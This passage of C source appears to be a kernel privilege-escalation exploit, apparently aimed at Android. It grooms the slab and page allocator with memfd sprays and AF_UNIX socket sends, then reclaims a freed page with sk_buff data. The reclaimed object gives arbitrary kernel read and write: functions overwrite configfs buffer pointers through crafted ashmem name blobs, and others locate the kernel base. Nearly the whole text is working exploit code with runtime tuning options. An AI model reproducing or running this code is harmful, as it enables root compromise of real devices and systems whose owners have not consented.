    sndbuf = LEGACY_RECLAIM_SNDBUF;
#else
    sndbuf = 1 << 20;
#endif
  }
#else
#ifdef LEGACY_RECLAIM_SNDBUF
  sndbuf = LEGACY_RECLAIM_SNDBUF;
#else
  sndbuf = 1 << 20;
#endif
#endif
  for (int s = 0; s < LEGACY_RECLAIM_SOCKETS; s++) {
#ifdef LEGACY_RECLAIM_SOCKET_TYPE
    SYSCHK(socketpair(AF_UNIX, LEGACY_RECLAIM_SOCKET_TYPE, 0, reclaim_sv[s]));
#else
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv[s]));
#endif
    errno = 0;
    int sndbuf_set_ret =
        setsockopt(reclaim_sv[s][0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
                   sizeof(sndbuf));
    int sndbuf_set_errno = errno;
    socklen_t sndbuf_len = sizeof(sndbuf);
    int sndbuf_effective = 0;
    errno = 0;
    int sndbuf_get_ret =
        getsockopt(reclaim_sv[s][0], SOL_SOCKET, SO_SNDBUF,
                   &sndbuf_effective, &sndbuf_len);
    int sndbuf_get_errno = errno;
    if (s == 0) {
      pr_info("sk_buff reclaim sndbuf request=%d effective=%d "
              "set_ret=%d set_errno=%d get_ret=%d get_errno=%d sockets=%d\n",
              sndbuf, sndbuf_effective, sndbuf_set_ret, sndbuf_set_errno,
              sndbuf_get_ret, sndbuf_get_errno, LEGACY_RECLAIM_SOCKETS);
    }
    int reclaim_flags = fcntl(reclaim_sv[s][0], F_GETFL, 0);
    if (reclaim_flags >= 0) {
      fcntl(reclaim_sv[s][0], F_SETFL, reclaim_flags | O_NONBLOCK);
    }
  }
  int pcp_shaping_sv[LEGACY_PCP_SHAPING_SOCKETS][2];
  for (int i = 0; i < LEGACY_PCP_SHAPING_SOCKETS; i++) {
    pcp_shaping_sv[i][0] = -1;
    pcp_shaping_sv[i][1] = -1;
  }
#if !(defined(LEGACY_DISABLE_PCP_SHAPING) && LEGACY_DISABLE_PCP_SHAPING)
  for (int i = 0; i < LEGACY_PCP_SHAPING_SOCKETS; i++) {
#ifdef LEGACY_RECLAIM_SOCKET_TYPE
    SYSCHK(socketpair(AF_UNIX, LEGACY_RECLAIM_SOCKET_TYPE, 0,
                      pcp_shaping_sv[i]));
#else
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv[i]));
#endif
    setsockopt(pcp_shaping_sv[i][0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
               sizeof(sndbuf));
    int pcp_flags = fcntl(pcp_shaping_sv[i][0], F_GETFL, 0);
    if (pcp_flags >= 0) {
      fcntl(pcp_shaping_sv[i][0], F_SETFL, pcp_flags | O_NONBLOCK);
    }
  }
#endif

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = LEGACY_RECLAIM_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

#if defined(LEGACY_ION_RECLAIM) && LEGACY_ION_RECLAIM
  int legacy_ion_prealloc_count = legacy_ion_preallocate();
  pr_info("ion order-4 prealloc=%d/%d\n", legacy_ion_prealloc_count,
          LEGACY_ION_PREALLOC_COUNT);
#endif

#if !(defined(LEGACY_DISABLE_PCP_SHAPING) && LEGACY_DISABLE_PCP_SHAPING)
  int pcp_shaping_sends = 1;
#ifdef LEGACY_PCP_SHAPING_SENDS
  pcp_shaping_sends = LEGACY_PCP_SHAPING_SENDS;
#endif
  int pcp_shaping_sent = 0;
  for (int socket_index = 0;
       socket_index < LEGACY_PCP_SHAPING_SOCKETS; socket_index++) {
    for (int i = 0; i < pcp_shaping_sends; i++) {
      if (sendmsg(pcp_shaping_sv[socket_index][0], &msg, MSG_DONTWAIT) <= 0) {
        break;
      }
      pcp_shaping_sent++;
    }
  }
  pr_info("sk_buff pre-shaping sends=%d/%d\n", pcp_shaping_sent,
          pcp_shaping_sends * LEGACY_PCP_SHAPING_SOCKETS);
#endif
#if defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
  /*
   * Make the target-release-to-skb-reclaim interval free of stdio flushes.
   * stdout is a regular-file stream under the payload runner, so an otherwise
   * harmless diagnostic can cross its buffer boundary at a nondeterministic
   * point and allocate while the order-3 page is briefly in the buddy.
   */
  SYSCHK(fflush(NULL));
#endif

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }
  size_t target_pre = pre_ctx.mm_cnt - 1;
  SYSCHK(close(pre_ctx.memfds[target_pre]));
  pre_ctx.memfds[target_pre] = -1;
  SYSCHK(close(post_ctx.memfds[0]));
  post_ctx.memfds[0] = -1;
#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
  pr_info("mm target-neighbor slab queued for late drain\n");
#endif
  for (size_t i = 0; i < target_pre; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 1; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  log_mm_slabinfo_port("after-target-neighbors");
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
    !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
  log_mm_slabinfo("after-target-neighbors");
#endif

#if !(defined(LEGACY_DISABLE_PCP_SHAPING) && LEGACY_DISABLE_PCP_SHAPING) && \
    !(defined(LEGACY_HOLD_PCP_SHAPING) && LEGACY_HOLD_PCP_SHAPING)
  for (int i = 0; i < LEGACY_PCP_SHAPING_SOCKETS; i++) {
    SYSCHK(close(pcp_shaping_sv[i][0]));
    SYSCHK(close(pcp_shaping_sv[i][1]));
  }
#endif
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
#if defined(LEGACY_POST_TARGET_CLOSE_USEC) && LEGACY_POST_TARGET_CLOSE_USEC
  usleep(LEGACY_POST_TARGET_CLOSE_USEC);
#endif
  log_mm_slabinfo_port("after-target-close");
  size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
#ifdef LEGACY_LATE_DRAIN_TRIGGERS
  drain_triggers = LEGACY_LATE_DRAIN_TRIGGERS;
#endif
#if defined(LEGACY_DRAIN_ALL_PREPARE) && LEGACY_DRAIN_ALL_PREPARE
  drain_triggers = prepare_ctx.mm_cnt;
#endif
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#ifdef APP_MM_LATE_DRAIN_TRIGGERS
  drain_triggers = APP_MM_LATE_DRAIN_TRIGGERS;
#endif
  pid_t deferred_reap_children[drain_triggers ? drain_triggers : 1];
  size_t deferred_reap_count = 0;
  memset(deferred_reap_children, 0, sizeof(deferred_reap_children));
#endif
  for (size_t i = 0; i < drain_triggers; i++) {
    size_t index =
#if defined(LEGACY_DRAIN_ALL_PREPARE) && LEGACY_DRAIN_ALL_PREPARE
        i;
#else
        i * mm_objs_per_slab;
#endif
    SYSCHK(close(prepare_ctx.memfds[index]));
    prepare_ctx.memfds[index] = -1;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#if (defined(APP_DEFER_ALL_DRAIN_REAPS) && \
     APP_DEFER_ALL_DRAIN_REAPS) || \
    (defined(APP_DEFER_FINAL_DRAIN_REAP) && \
     APP_DEFER_FINAL_DRAIN_REAP)
    int defer_reap = 0;
#if defined(APP_DEFER_ALL_DRAIN_REAPS) && APP_DEFER_ALL_DRAIN_REAPS
    defer_reap = 1;
#elif defined(APP_DEFER_FINAL_DRAIN_REAP) && APP_DEFER_FINAL_DRAIN_REAP
    defer_reap = i + 1 == drain_triggers;
#endif
    if (defer_reap) {
      pid_t child = prepare_ctx.childs[index];
      SYSCHK(kill(child, SIGKILL));
      siginfo_t child_info;
      memset(&child_info, 0, sizeof(child_info));
      int wait_ret;
      do {
        wait_ret = waitid(P_PID, child, &child_info,
                          WEXITED | WNOWAIT);
      } while (wait_ret < 0 && errno == EINTR);
      SYSCHK(wait_ret);
      deferred_reap_children[deferred_reap_count++] = child;
      prepare_ctx.childs[index] = -1;
#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
      pr_info("mm drain child exited deferred-reap trigger=%zu/%zu pid=%d "
              "code=%d status=%d\n",
              i + 1, drain_triggers, child, child_info.si_code,
              child_info.si_status);
#endif
      continue;
    }
#endif
#endif
    kill_child(prepare_ctx.childs[index]);
    prepare_ctx.childs[index] = -1;
  }
#if defined(LEGACY_DRAIN_ALL_CTX_MEMFDS) && LEGACY_DRAIN_ALL_CTX_MEMFDS
  struct mm_ctx *full_release_ctxs[] = {
    &prepare_ctx, &spray_ctx, &pre_ctx, &post_ctx,
  };
  for (size_t ctx_index = 0;
       ctx_index < sizeof(full_release_ctxs) / sizeof(full_release_ctxs[0]);
       ctx_index++) {
    struct mm_ctx *ctx = full_release_ctxs[ctx_index];
    for (size_t i = 0; i < ctx->mm_cnt; i++) {
      if (ctx->memfds[i] >= 0) {
        close(ctx->memfds[i]);
        ctx->memfds[i] = -1;
      }
    }
  }
#endif
#if defined(LEGACY_ION_RECLAIM) && LEGACY_ION_RECLAIM
  struct mm_ctx *ion_release_ctxs[] = {
    &prepare_ctx, &spray_ctx, &pre_ctx, &post_ctx,
  };
  for (size_t ctx_index = 0;
       ctx_index < sizeof(ion_release_ctxs) / sizeof(ion_release_ctxs[0]);
       ctx_index++) {
    struct mm_ctx *ctx = ion_release_ctxs[ctx_index];
    for (size_t i = 0; i < ctx->mm_cnt; i++) {
      if (ctx->memfds[i] >= 0) {
        close(ctx->memfds[i]);
        ctx->memfds[i] = -1;
      }
    }
  }
  int legacy_ion_reclaimed = legacy_ion_reclaim_payload();
#endif
  log_mm_slabinfo_port("after-prepare-drain");
#if (!defined(APP_REQUIRE_FRESH_P0_SESSION) || !APP_REQUIRE_FRESH_P0_SESSION) && \
    !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
#endif
  int reclaim_sends = SKB_RECLAIM_SENDS;
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    reclaim_sends = APP_SLIDE_RECLAIM_SENDS;
  }
#endif
  int reclaim_sent = 0;
  int reclaim_errno = 0;
  for (int s = 0; s < LEGACY_RECLAIM_SOCKETS; s++) {
    int socket_sent = 0;
    for (int i = 0; i < reclaim_sends; i++) {
      errno = 0;
      ssize_t sent = sendmsg(reclaim_sv[s][0], &msg, MSG_DONTWAIT);
      if (sent <= 0) {
        reclaim_errno = errno;
        break;
      }
      reclaim_sent++;
      socket_sent++;
    }
    pr_info("sk_buff reclaim socket=%d sends=%d/%d mode=%d stop_errno=%d\n",
            s, socket_sent, reclaim_sends, payload_mode, reclaim_errno);
  }
#if !(defined(LEGACY_DISABLE_PCP_SHAPING) && LEGACY_DISABLE_PCP_SHAPING) && \
    defined(LEGACY_HOLD_PCP_SHAPING) && LEGACY_HOLD_PCP_SHAPING
  for (int i = 0; i < LEGACY_PCP_SHAPING_SOCKETS; i++) {
    SYSCHK(close(pcp_shaping_sv[i][0]));
    SYSCHK(close(pcp_shaping_sv[i][1]));
  }
#endif
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  for (size_t i = 0; i < deferred_reap_count; i++) {
    SYSCHK(waitpid(deferred_reap_children[i], NULL, 0));
    pr_info("mm drain child reaped after reclaim index=%zu/%zu pid=%d\n",
            i + 1, deferred_reap_count, deferred_reap_children[i]);
  }
#if defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
  pr_info("mm quiet reclaim window completed deferred-exits=%zu\n",
          deferred_reap_count);
#endif
  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
  pr_info("sk_buff reclaim sends=%d/%d mode=%d stop_errno=%d\n",
          reclaim_sent, reclaim_sends * LEGACY_RECLAIM_SOCKETS,
          payload_mode, reclaim_errno);
  log_mm_slabinfo("after-exact-drain-reclaim");
#else
  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
          reclaim_sent, reclaim_sends * LEGACY_RECLAIM_SOCKETS,
          payload_mode);
#if defined(LEGACY_ION_RECLAIM) && LEGACY_ION_RECLAIM
  pr_info("ion order-4 reclaim=%d/%d\n", legacy_ion_reclaimed,
          LEGACY_ION_RECLAIM_COUNT);
#endif
#endif
  log_mm_slabinfo_port("after-reclaim");
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
          payload_mode, base);
#endif
  if (ks) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
  }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=kernelsnitch done mode=%d\n",
          payload_mode);

  pr_info("kernel page cleanup stage=prepare-children begin count=%zu\n",
          prepare_ctx.mm_cnt);
#endif
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
      prepare_ctx.memfds[i] = -1;
    }
    if (prepare_ctx.childs[i] > 0) {
      kill_child(prepare_ctx.childs[i]);
      prepare_ctx.childs[i] = -1;
    }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    if ((i + 1) % (8 * mm_objs_per_slab) == 0 ||
        i + 1 == prepare_ctx.mm_cnt) {
      pr_info("kernel page cleanup stage=prepare-children progress=%zu/%zu\n",
              i + 1, prepare_ctx.mm_cnt);
    }
#endif
  }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=prepare-children done base=%016zx\n",
          base);
#endif

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  size_t runtime_max_attempts = (size_t)max_attempts;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    (void)env_size_t_override("FOPS_KERNEL_PAGE_SETUP_ATTEMPTS_RUNTIME",
                              &runtime_max_attempts);
  } else if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    (void)env_size_t_override("SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS_RUNTIME",
                              &runtime_max_attempts);
  }
  (void)env_size_t_override("KERNEL_PAGE_SETUP_ATTEMPTS_RUNTIME",
                            &runtime_max_attempts);
  if (runtime_max_attempts < 1) {
    runtime_max_attempts = 1;
  }
  if (runtime_max_attempts > 1024) {
    runtime_max_attempts = 1024;
  }
  max_attempts = (int)runtime_max_attempts;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    forced_pre_ctx_mm_count = 0;
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      if (env_size_t_sequence_value("FOPS_PRE_CTX_COUNT_SEQUENCE_RUNTIME",
                                    fops_pre_ctx_sequence_cursor,
                                    &forced_pre_ctx_mm_count)) {
        pr_info("kernel page prepare using runtime fops pre_ctx sequence index=%zu count=%zu\n",
                fops_pre_ctx_sequence_cursor, forced_pre_ctx_mm_count);
        fops_pre_ctx_sequence_cursor++;
      }
    }
#if defined(FOPS_PRE_CTX_COUNT_SEQUENCE)
    static const size_t fops_pre_ctx_count_sequence[] = {
        FOPS_PRE_CTX_COUNT_SEQUENCE
    };
    if (payload_mode == PAGE_PAYLOAD_FOPS && !forced_pre_ctx_mm_count) {
      size_t count_index = fops_pre_ctx_sequence_cursor++ %
          (sizeof(fops_pre_ctx_count_sequence) /
           sizeof(fops_pre_ctx_count_sequence[0]));
      forced_pre_ctx_mm_count = fops_pre_ctx_count_sequence[count_index];
      pr_info("kernel page prepare using fops pre_ctx sequence index=%zu count=%zu\n",
              count_index, forced_pre_ctx_mm_count);
    }
#endif
    size_t started_ns = gettime_ns();
    uintptr_t base = prepare_kernel_page(payload_mode);
    forced_pre_ctx_mm_count = 0;
    size_t elapsed_ms = (gettime_ns() - started_ns) / 1000000ULL;
    pr_info("kernel page prepare mode=%d attempt=%d/%d elapsed_ms=%zu "
            "base=%016zx\n",
            payload_mode, attempt, max_attempts, elapsed_ms, base);
    if (base) {
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  pr_info("configfs write setup fd=%d target=%016zx len=%zu ret=%d errno=%d\n",
          fd, target, len, set_ret, set_errno);
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  int write_errno = errno;
  pr_info("configfs write data fd=%d target=%016zx len=%zu ret=%zd errno=%d\n",
          fd, target, len, wr, write_errno);
  errno = write_errno;
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}
